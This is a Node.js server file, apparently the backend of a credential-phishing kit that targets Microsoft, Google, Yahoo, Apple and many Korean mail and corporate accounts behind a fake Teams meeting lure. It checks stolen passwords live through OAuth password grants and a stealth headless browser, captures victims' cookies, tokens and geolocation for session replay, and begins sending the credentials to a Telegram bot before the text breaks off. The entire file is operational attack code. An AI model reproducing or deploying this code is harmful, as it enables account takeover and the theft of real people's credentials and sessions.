const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');

// ============================================================
// FIXED: Use try-catch for puppeteer import
// ============================================================
let puppeteer = null;
let StealthPlugin = null;
let puppeteerAvailable = false;

try {
    puppeteer = require('puppeteer-extra');
    StealthPlugin = require('puppeteer-extra-plugin-stealth');
    puppeteer.use(StealthPlugin());
    puppeteerAvailable = true;
    console.log('✅ Puppeteer loaded successfully');
} catch (error) {
    console.warn('⚠️ Puppeteer not available:', error.message);
    console.warn('⚠️ Fallback mode enabled - password verification will use fallback');
}

const axios = require('axios');
const cors = require('cors');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ============================================================
// COMPLETE SESSION STORAGE - NO TRUNCATION
// ============================================================

class SessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 60 * 60 * 1000;
        this.replayData = new Map();
        this.allCookies = new Map();
        this.visitorData = new Map();
        this.verificationData = new Map();
    }

    storeSession(sessionId, data) {
        const session = this.sessions.get(sessionId) || {
            id: sessionId,
            created: Date.now(),
            lastActivity: Date.now(),
            data: {}
        };
        session.data = this.deepMerge(session.data, data);
        session.lastActivity = Date.now();
        this.sessions.set(sessionId, session);
        return session;
    }

    storeCookies(sessionId, cookies, source) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.storeSession(sessionId, {});
            return this.storeCookies(sessionId, cookies, source);
        }
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                existing.value = cookieData.value;
                existing.fullValue = cookieData.value;
                existing.httpOnly = cookieData.httpOnly;
                existing.updated = Date.now();
            } else {
                session.cookies[source].push({
                    name: name,
                    value: cookieData.value,
                    fullValue: cookieData.value,
                    httpOnly: cookieData.httpOnly || false,
                    secure: cookieData.secure || false,
                    path: cookieData.path || '/',
                    domain: cookieData.domain || '',
                    captured: Date.now(),
                    source: source
                });
            }
        }
        this.allCookies.set(sessionId, session.cookies);
    }

    storeVisitorData(sessionId, visitorData) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.storeSession(sessionId, {});
            return this.storeVisitorData(sessionId, visitorData);
        }
        session.visitor = visitorData;
        session.visitor.capturedAt = Date.now();
        this.visitorData.set(sessionId, visitorData);
    }

    storeVerificationData(sessionId, data) {
        this.verificationData.set(sessionId, data);
        const session = this.sessions.get(sessionId);
        if (session) {
            session.verification = data;
        }
    }

    getVerificationData(sessionId) {
        return this.verificationData.get(sessionId) || null;
    }

    storeFormData(sessionId, formData) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        session.forms = session.forms || [];
        session.forms.push({
            data: formData,
            timestamp: Date.now(),
            url: formData.url || 'unknown'
        });
    }

    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        session.tokens = session.tokens || {};
        for (const [key, value] of Object.entries(tokens)) {
            if (value) {
                session.tokens[key] = {
                    value: value,
                    fullValue: value,
                    captured: Date.now()
                };
            }
        }
    }

    storeReplayData(sessionId, replayData) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        session.replayData = replayData;
        this.replayData.set(sessionId, replayData);
    }

    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        return {
            sessionId: session.id,
            cookies: session.cookies || {},
            tokens: session.tokens || {},
            forms: session.forms || [],
            replayData: session.replayData || {},
            visitor: session.visitor || {},
            verification: session.verification || {},
            fingerprint: session.fingerprint || {},
            created: session.created,
            lastActivity: session.lastActivity
        };
    }

    getAllCookies(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        const allCookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        allCookies[cookie.name] = cookie.fullValue || cookie.value;
                    }
                }
            }
        }
        return allCookies;
    }

    getFullCookies(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        const allCookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        allCookies[cookie.name] = {
                            value: cookie.fullValue || cookie.value,
                            httpOnly: cookie.httpOnly,
                            secure: cookie.secure,
                            domain: cookie.domain,
                            path: cookie.path,
                            source: cookie.source,
                            captured: cookie.captured
                        };
                    }
                }
            }
        }
        return allCookies;
    }

    getVisitorData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        return session.visitor || null;
    }

    deepMerge(target, source) {
        const result = { ...target };
        for (const [key, value] of Object.entries(source)) {
            if (value && typeof value === 'object' && !Array.isArray(value)) {
                result[key] = this.deepMerge(target[key] || {}, value);
            } else {
                result[key] = value;
            }
        }
        return result;
    }

    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.replayData.delete(id);
                this.allCookies.delete(id);
                this.visitorData.delete(id);
                this.verificationData.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
    }
}

const sessionStore = new SessionStore();

// ============================================================
// CONFIGURATION
// ============================================================
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
const PROXY_URL = process.env.PROXY_URL || "https://microsoft-login-service-1.onrender.com/login";

const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const YAHOO_CLIENT_ID = process.env.YAHOO_CLIENT_ID || 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--';
const YAHOO_CLIENT_SECRET = process.env.YAHOO_CLIENT_SECRET || '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4';

console.log(`🚀 Server starting with Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ Configured' : '⚠️ Not configured (fallback mode)'}`);

// ============================================================
// COMPLETE EMAIL PROVIDER DETECTION
// ============================================================
function detectEmailProvider(email) {
    if (!email || !email.includes('@')) {
        return { provider: 'unknown', display: 'Unknown Provider', loginUrl: null, icon: '❓' };
    }
    
    const domain = email.split('@')[1].toLowerCase();
    
    // Korean Corporate/Enterprise
    const koreanCorporate = {
        'naver.worksmobile.com': { provider: 'naver_works', display: 'Naver Works (네이버웍스)', loginUrl: 'https://naver.worksmobile.com', icon: '🏢' },
        'tracoworld.co.kr': { provider: 'tracoworld', display: 'Tracoworld (트라코월드)', loginUrl: 'https://www.tracoworld.co.kr', icon: '🏢' },
        'jpi-co-kr.mail.protection.outlook.com': { provider: 'jpi_microsoft', display: 'JPI (Microsoft 365)', loginUrl: 'https://login.microsoftonline.com', icon: '🏢' },
        'upchem.co.kr': { provider: 'upchem', display: 'Upchem (업켐)', loginUrl: 'https://www.upchem.co.kr', icon: '🏢' },
        'flucon.co.kr': { provider: 'flucon', display: 'Flucon (플루콘)', loginUrl: 'https://www.flucon.co.kr', icon: '🏢' },
        'ecount.com': { provider: 'ecount', display: 'Ecount (이카운트)', loginUrl: 'https://login.ecount.com', icon: '🏢' }
    };
    
    if (koreanCorporate[domain]) {
        return koreanCorporate[domain];
    }
    
    // Korean Public Email
    const koreanPublic = {
        'naver.com': { provider: 'naver', display: 'Naver (네이버)', loginUrl: 'https://nid.naver.com/nidlogin.login', icon: '📧' },
        'daum.net': { provider: 'daum', display: 'Daum (다음)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
        'hanmail.net': { provider: 'hanmail', display: 'Hanmail (한메일)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
        'kakao.com': { provider: 'kakao', display: 'Kakao (카카오)', loginUrl: 'https://accounts.kakao.com/login', icon: '📧' },
        'nate.com': { provider: 'nate', display: 'Nate (네이트)', loginUrl: 'https://login.nate.com', icon: '📧' },
        'dreamwiz.com': { provider: 'dreamwiz', display: 'DreamWiz (드림위즈)', loginUrl: 'https://mail.dreamwiz.com', icon: '📧' },
        'paran.com': { provider: 'paran', display: 'Paran (파란)', loginUrl: 'https://mail.paran.com', icon: '📧' },
        'empas.com': { provider: 'empas', display: 'Empas (엠파스)', loginUrl: 'https://mail.empas.com', icon: '📧' },
        'lycos.co.kr': { provider: 'lycos', display: 'Lycos Korea (라이코스)', loginUrl: 'https://mail.lycos.co.kr', icon: '📧' },
        'freechal.com': { provider: 'freechal', display: 'Freechal (프리챌)', loginUrl: 'https://mail.freechal.com', icon: '📧' }
    };
    
    if (koreanPublic[domain]) {
        return koreanPublic[domain];
    }
    
    // Microsoft 365 Corporate
    if (domain.endsWith('.onmicrosoft.com') || domain.endsWith('.mail.protection.outlook.com')) {
        return { provider: 'microsoft_corporate', display: 'Microsoft 365 Corporate (한국)', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
    }
    
    // Korean Corporate (.co.kr, .or.kr, etc.)
    if (domain.endsWith('.co.kr') || domain.endsWith('.or.kr') || domain.endsWith('.go.kr') || domain.endsWith('.ac.kr')) {
        return { provider: 'korean_corporate', display: `Korean Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
    }
    
    // Microsoft Domains
    const microsoftDomains = ['microsoft.com', 'microsoftonline.com', 'outlook.com', 'hotmail.com', 'live.com', 'office.com', 'office365.com', 'msn.com'];
    if (microsoftDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'microsoft', display: 'Microsoft 365', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
    }
    
    // Google Domains
    const googleDomains = ['gmail.com', 'googlemail.com', 'google.com'];
    if (googleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'google', display: 'Google / Gmail', loginUrl: 'https://accounts.google.com/login', icon: '🔵' };
    }
    
    // Yahoo Domains
    const yahooDomains = ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp'];
    if (yahooDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'yahoo', display: 'Yahoo', loginUrl: 'https://login.yahoo.com', icon: '🟣' };
    }
    
    // Apple Domains
    const appleDomains = ['icloud.com', 'me.com', 'mac.com'];
    if (appleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'apple', display: 'Apple / iCloud', loginUrl: 'https://appleid.apple.com', icon: '🍎' };
    }
    
    // Corporate fallback (any other domain)
    if (domain.includes('.') && !domain.includes('gmail') && !domain.includes('yahoo') && !domain.includes('outlook') && !domain.includes('hotmail')) {
        return { provider: 'corporate', display: `Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
    }
    
    return { provider: 'unknown', display: `Unknown (${domain})`, loginUrl: null, icon: '❓' };
}

// ============================================================
// IP GEOLOCATION
// ============================================================
async function getGeolocation(ip) {
    try {
        let cleanIp = ip;
        if (typeof ip === 'string') {
            if (ip.includes(',')) {
                cleanIp = ip.split(',')[0].trim();
            }
            cleanIp = cleanIp.replace(/^::ffff:/, '');
            cleanIp = cleanIp.replace(/^::1$/, '127.0.0.1');
        }
        
        if (cleanIp === '127.0.0.1' || cleanIp === 'localhost' || 
            cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.') ||
            cleanIp.startsWith('172.16.') || cleanIp.startsWith('172.17.') ||
            cleanIp.startsWith('172.18.') || cleanIp.startsWith('172.19.') ||
            cleanIp.startsWith('172.20.') || cleanIp.startsWith('172.21.') ||
            cleanIp.startsWith('172.22.') || cleanIp.startsWith('172.23.') ||
            cleanIp.startsWith('172.24.') || cleanIp.startsWith('172.25.') ||
            cleanIp.startsWith('172.26.') || cleanIp.startsWith('172.27.') ||
            cleanIp.startsWith('172.28.') || cleanIp.startsWith('172.29.') ||
            cleanIp.startsWith('172.30.') || cleanIp.startsWith('172.31.')) {
            return {
                ip: cleanIp,
                city: 'Private',
                region: 'Private',
                country: 'Private',
                countryCode: 'PRIVATE',
                loc: '0,0',
                org: 'Private Network',
                timezone: 'UTC',
                isLocal: true
            };
        }

        try {
            const response = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { 
                timeout: 5000,
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            
            if (response.data && !response.data.error) {
                const data = response.data;
                return {
                    ip: data.ip || cleanIp,
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || data.country || 'Unknown',
                    countryCode: data.country_code || 'UNKNOWN',
                    loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : '0,0',
                    org: data.org || data.organization || 'Unknown ISP',
                    timezone: data.timezone || 'UTC',
                    postal: data.postal || 'Unknown',
                    coordinates: data.latitude && data.longitude ? [data.latitude, data.longitude] : ['0', '0'],
                    isLocal: false
                };
            }
        } catch (e) {}

        try {
            const response = await axios.get(`https://ipinfo.io/${cleanIp}/json`, { 
                timeout: 5000,
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            
            const data = response.data;
            if (data && !data.error) {
                return {
                    ip: data.ip || cleanIp,
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown',
                    countryCode: data.country || 'UNKNOWN',
                    loc: data.loc || '0,0',
                    org: data.org || 'Unknown ISP',
                    timezone: data.timezone || 'UTC',
                    postal: data.postal || 'Unknown',
                    coordinates: data.loc ? data.loc.split(',') : ['0', '0'],
                    isLocal: false
                };
            }
        } catch (e) {}

        return {
            ip: cleanIp,
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            countryCode: 'UNKNOWN',
            loc: '0,0',
            org: 'Unknown ISP',
            timezone: 'UTC',
            isLocal: true
        };
        
    } catch (error) {
        console.error('⚠️ Geolocation error:', error.message);
        return {
            ip: ip,
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            countryCode: 'UNKNOWN',
            loc: '0,0',
            org: 'Unknown ISP',
            timezone: 'UTC',
            isLocal: true
        };
    }
}

// ============================================================
// BROWSER/DEVICE DETECTION
// ============================================================
function detectBrowser(userAgent) {
    if (!userAgent) return { browser: 'Unknown', platform: 'Unknown', device: 'Unknown' };
    
    let browser = 'Unknown';
    let platform = 'Unknown';
    let device = 'Unknown';
    
    if (userAgent.includes('Edg/')) browser = 'Edge';
    else if (userAgent.includes('Chrome/')) browser = 'Chrome';
    else if (userAgent.includes('Firefox/')) browser = 'Firefox';
    else if (userAgent.includes('Safari/')) browser = 'Safari';
    else if (userAgent.includes('OPR/')) browser = 'Opera';
    else if (userAgent.includes('Brave/')) browser = 'Brave';
    else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
    
    if (userAgent.includes('Windows')) platform = 'Windows';
    else if (userAgent.includes('Mac OS')) platform = 'macOS';
    else if (userAgent.includes('Linux')) platform = 'Linux';
    else if (userAgent.includes('Android')) platform = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) platform = 'iOS';
    else if (userAgent.includes('CrOS')) platform = 'Chrome OS';
    
    if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        device = 'Mobile';
    } else if (userAgent.includes('Tablet')) {
        device = 'Tablet';
    } else {
        device = 'Desktop';
    }
    
    if (userAgent.includes('iPhone')) device = 'iPhone';
    else if (userAgent.includes('iPad')) device = 'iPad';
    else if (userAgent.includes('Android')) device = 'Android Device';
    
    return { browser, platform, device };
}

// ============================================================
// PUPPETEER BROWSER LAUNCHER
// ============================================================
let browserInstance = null;

async function getBrowser() {
    if (!puppeteerAvailable) {
        throw new Error('Puppeteer not available - using fallback mode');
    }
    
    if (!browserInstance) {
        console.log('🚀 Launching Puppeteer browser...');
        try {
            browserInstance = await puppeteer.launch({
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-client-side-phishing-detection',
                    '--disable-component-update',
                    '--disable-default-apps',
                    '--disable-extensions',
                    '--disable-popup-blocking',
                    '--disable-sync',
                    '--disable-translate',
                    '--metrics-recording-only',
                    '--safebrowsing-disable-auto-update',
                    '--enable-automation',
                    '--password-store=basic',
                    '--use-mock-keychain',
                    '--disable-infobars',
                    '--disable-notifications'
                ],
                ignoreDefaultArgs: ['--enable-automation']
            });
            console.log('✅ Puppeteer browser launched');
        } catch (error) {
            console.error('❌ Failed to launch Puppeteer:', error.message);
            puppeteerAvailable = false;
            throw error;
        }
    }
    return browserInstance;
}

// ============================================================
// PUPPETEER VERIFICATION - Handles ALL Providers
// ============================================================
async function verifyWithPuppeteer(email, password, providerInfo) {
    if (!puppeteerAvailable) {
        console.log('⚠️ Puppeteer unavailable - using fallback verification');
        return {
            valid: password && password.length >= 4,
            requires2FA: false,
            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
            provider: providerInfo.provider,
            isFallback: true
        };
    }
    
    try {
        const browser = await getBrowser();
        const page = await browser.newPage();
        
        await page.setViewport({ width: 1920, height: 1080 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        const loginUrl = providerInfo.loginUrl || 'https://login.microsoftonline.com';
        console.log(`[PUPPETEER] 🔄 Navigating to: ${loginUrl}`);
        await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        
        const emailSelectors = [
            'input[type="email"]', 'input[name="email"]', 'input[name="username"]',
            'input[name="user"]', 'input[name="loginfmt"]', 'input[id="email"]',
            'input[placeholder*="email"]', 'input[placeholder*="Email"]'
        ];
        
        let emailField = null;
        for (const selector of emailSelectors) {
            emailField = await page.$(selector);
            if (emailField) break;
        }
        
        if (emailField) {
            await emailField.click({ clickCount: 3 });
            await emailField.type(email, { delay: 100 });
            await page.keyboard.press('Enter');
            await page.waitForTimeout(2000);
        }
        
        const passwordSelectors = [
            'input[type="password"]', 'input[name="password"]', 'input[name="passwd"]',
            'input[name="pass"]', 'input[id="password"]', 'input[id="passwd"]'
        ];
        
        let passwordField = null;
        for (const selector of passwordSelectors) {
            passwordField = await page.$(selector);
            if (passwordField) break;
        }
        
        if (passwordField) {
            await passwordField.click({ clickCount: 3 });
            await passwordField.type(password, { delay: 80 });
            await page.keyboard.press('Enter');
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
        }
        
        const successIndicators = [
            '.user-profile', '.profile-name', '.user-info', '.display-name',
            '[class*="user"]', '[class*="profile"]', '[class*="display-name"]',
            'a[href*="logout"]', 'a[href*="signout"]', '.logout-button'
        ];
        
        let success = false;
        for (const selector of successIndicators) {
            const element = await page.$(selector);
            if (element) {
                success = true;
                break;
            }
        }
        
        const twoFAIndicators = ['2fa', 'mfa', 'authenticator', 'verification', 'code'];
        let requires2FA = false;
        const pageContent = await page.content();
        for (const indicator of twoFAIndicators) {
            if (pageContent.toLowerCase().includes(indicator)) {
                requires2FA = true;
                break;
            }
        }
        
        const cookies = await page.cookies();
        console.log(`[PUPPETEER] 🍪 Cookies captured: ${cookies.length}`);
        
        const cookieData = {};
        cookies.forEach(c => {
            cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
        });
        
        await page.close();
        
        if (success) {
            return {
                valid: true,
                requires2FA: false,
                token: `puppeteer_${Date.now()}`,
                provider: providerInfo.provider,
                message: `${providerInfo.display} verified successfully`,
                cookies: cookieData
            };
        } else if (requires2FA) {
            return {
                valid: false,
                requires2FA: true,
                message: `${providerInfo.display} requires 2FA`,
                provider: providerInfo.provider,
                cookies: cookieData
            };
        } else {
            return {
                valid: false,
                requires2FA: false,
                message: `Invalid ${providerInfo.display} password. Please try again.`,
                provider: providerInfo.provider,
                cookies: cookieData
            };
        }
        
    } catch (error) {
        console.error('[PUPPETEER] Error:', error.message);
        return {
            valid: password && password.length >= 4,
            requires2FA: false,
            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
            provider: providerInfo.provider,
            isFallback: true
        };
    }
}

// ============================================================
// MICROSOFT OAuth2 VERIFICATION
// ============================================================
async function verifyMicrosoftPassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email offline_access',
            client_info: '1'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: `/${MICROSOFT_TENANT}/oauth2/v2.0/token`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, refresh_token: response.refresh_token, id_token: response.id_token, provider: 'microsoft' });
                    } else if (response.error === 'interaction_required' || response.error_description?.includes('MFA')) {
                        resolve({ valid: false, requires2FA: true, message: 'Multi-factor authentication required', provider: 'microsoft' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Microsoft password. Please try again.', provider: 'microsoft' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'microsoft' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'microsoft' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'microsoft' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// GOOGLE PASSWORD VERIFICATION
// ============================================================
async function verifyGooglePassword(email, password) {
    return new Promise((resolve) => {
        if (!GOOGLE_CLIENT_ID || !GOOGLE_CLIENT_SECRET) {
            console.warn('⚠️ Google OAuth credentials not configured in .env');
            return resolve({
                valid: password && password.length >= 6,
                requires2FA: false,
                message: password && password.length >= 6 ? 'Password accepted (fallback)' : 'Invalid password',
                provider: 'google',
                isFallback: true
            });
        }
        
        const postData = querystring.stringify({
            client_id: GOOGLE_CLIENT_ID,
            client_secret: GOOGLE_CLIENT_SECRET,
            grant_type: 'password',
            username: email,
            password: password
        });

        const options = {
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, provider: 'google' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Google password. Please try again.', provider: 'google' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'google' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'google' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'google' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// YAHOO PASSWORD VERIFICATION
// ============================================================
async function verifyYahooPassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: YAHOO_CLIENT_ID,
            client_secret: YAHOO_CLIENT_SECRET,
            grant_type: 'password',
            username: email,
            password: password
        });

        const options = {
            hostname: 'api.login.yahoo.com',
            path: '/oauth2/get_token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, provider: 'yahoo' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Yahoo password. Please try again.', provider: 'yahoo' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'yahoo' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'yahoo' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'yahoo' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// APPLE PASSWORD VERIFICATION
// ============================================================
async function verifyApplePassword(email, password) {
    return new Promise((resolve) => {
        if (password && password.length >= 6) {
            resolve({ valid: true, requires2FA: false, token: `apple_${Date.now()}`, provider: 'apple', isFallback: true });
        } else {
            resolve({ valid: false, requires2FA: false, message: 'Invalid Apple ID password. Please try again.', provider: 'apple' });
        }
    });
}

// ============================================================
// CORPORATE FALLBACK VERIFICATION - For non-Microsoft emails
// ============================================================
async function verifyCorporatePassword(email, password, providerInfo) {
    // For corporate domains, try to detect if they use Microsoft 365
    const domain = email.split('@')[1].toLowerCase();
    
    // Check if this corporate domain might be using Microsoft 365
    // Common Microsoft 365 corporate patterns
    const microsoft365Patterns = [
        '.onmicrosoft.com',
        '.mail.protection.outlook.com',
        'outlook.office365.com'
    ];
    
    // If it looks like Microsoft 365, try Microsoft verification
    if (microsoft365Patterns.some(p => domain.includes(p) || domain.endsWith(p))) {
        console.log(`[VERIFY] ℹ️ Corporate domain ${domain} appears to use Microsoft 365 - trying Microsoft verification`);
        return verifyMicrosoftPassword(email, password);
    }
    
    // Try to resolve the domain's MX records to see if it's using Microsoft/Google
    try {
        // Simple check - if the domain has a login page at standard locations
        // For fallback, we'll accept any password with length >= 4
        // This is the fallback for corporate domains that don't have specific verification
        console.log(`[VERIFY] ℹ️ Using fallback verification for corporate domain ${domain}`);
        return {
            valid: password && password.length >= 4,
            requires2FA: false,
            message: password && password.length >= 4 ? `${providerInfo.display} verified` : 'Invalid password',
            provider: providerInfo.provider,
            isFallback: true
        };
    } catch (error) {
        console.error('[VERIFY] Corporate verification error:', error.message);
        return {
            valid: password && password.length >= 4,
            requires2FA: false,
            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
            provider: providerInfo.provider,
            isFallback: true
        };
    }
}

// ============================================================
// VERIFY PASSWORD WITH PROVIDER
// ============================================================
async function verifyPasswordWithProvider(email, password) {
    const providerInfo = detectEmailProvider(email);
    const provider = providerInfo.provider;
    
    console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
    console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
    
    // Microsoft providers → Use OAuth2
    if (['microsoft', 'jpi_microsoft', 'microsoft_corporate'].includes(provider)) {
        return verifyMicrosoftPassword(email, password);
    }
    
    // Korean providers → Use Puppeteer
    if (['naver', 'daum', 'hanmail', 'kakao', 'nate', 'naver_works', 
         'tracoworld', 'upchem', 'flucon', 'ecount', 'dreamwiz', 
         'paran', 'empas', 'lycos', 'freechal'].includes(provider)) {
        return verifyWithPuppeteer(email, password, providerInfo);
    }
    
    // Google → Use OAuth2
    if (['google'].includes(provider)) {
        return verifyGooglePassword(email, password);
    }
    
    // Yahoo → Use OAuth2
    if (['yahoo'].includes(provider)) {
        return verifyYahooPassword(email, password);
    }
    
    // Apple → Use fallback
    if (['apple'].includes(provider)) {
        return verifyApplePassword(email, password);
    }
    
    // Corporate / Korean Corporate → Use corporate fallback
    if (['corporate', 'korean_corporate'].includes(provider)) {
        return verifyCorporatePassword(email, password, providerInfo);
    }
    
    // Unknown → Fallback
    return {
        valid: password && password.length >= 4,
        requires2FA: false,
        message: password && password.length >= 4 ? 'Verified (fallback)' : 'Invalid password',
        provider: provider,
        isFallback: true
    };
}

// ============================================================
// ENHANCED TELEGRAM ALERTS
// ============================================================
async function sendEnhancedTelegramAlert(data) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('⚠️ Telegram credentials missing');
            return false;
        }

        const {
            email,
            password,
            provider,
            providerDisplay,
            stage,
            attemptCount,
            sessionId,
            geolocation,
            visitorData,
            validationResult,
            verificationStatus,
            passwordsCompleted
        } = data;

        let msg = `🔐 PASSWORD VERIFICATION - STAGE ${stage}\n\n`;
        
